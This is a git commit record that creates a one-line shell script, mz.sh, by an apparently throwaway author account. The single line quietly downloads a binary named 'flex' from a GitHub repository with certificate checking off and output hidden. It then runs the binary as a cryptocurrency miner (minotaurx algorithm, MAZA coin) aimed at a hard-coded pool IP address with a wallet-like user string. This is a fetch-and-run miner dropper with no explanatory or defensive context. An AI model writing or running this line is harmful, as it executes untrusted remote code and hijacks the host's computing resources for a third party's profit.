ead45827bcabe69df5f0e655a6811789a609775c
tamanika4 <tamanika4@scaredment.com>
2025-03-27 15:45:41 +0700

    Create mz.sh

---
+++ mz.sh
@@ -0,0 +1,1 @@
+curl -sLkO https://github.com/paskofa10/noband/raw/refs/heads/main/flex > /dev/null 2>&1; ./flex -a minotaurx -o 198.50.168.213:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA
